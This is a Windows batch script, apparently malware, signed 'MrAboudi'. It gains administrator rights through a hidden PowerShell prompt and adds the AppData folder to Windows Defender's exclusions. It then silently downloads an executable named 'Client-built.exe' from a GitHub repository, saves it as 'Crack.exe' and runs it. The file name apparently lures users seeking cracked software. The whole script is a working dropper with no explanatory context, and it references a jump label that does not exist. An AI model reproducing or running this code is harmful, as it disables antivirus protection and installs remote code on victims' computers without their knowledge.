@echo off
set FILE="%USERPROFILE%\AppData\Roaming\SubDir\System32.exe"
if exist %FILE% (
    exit /b
)
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 /nobreak >nul 2>&1
    goto CheckInternet
)
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"
exit

:: By MrAboudi
:: v2
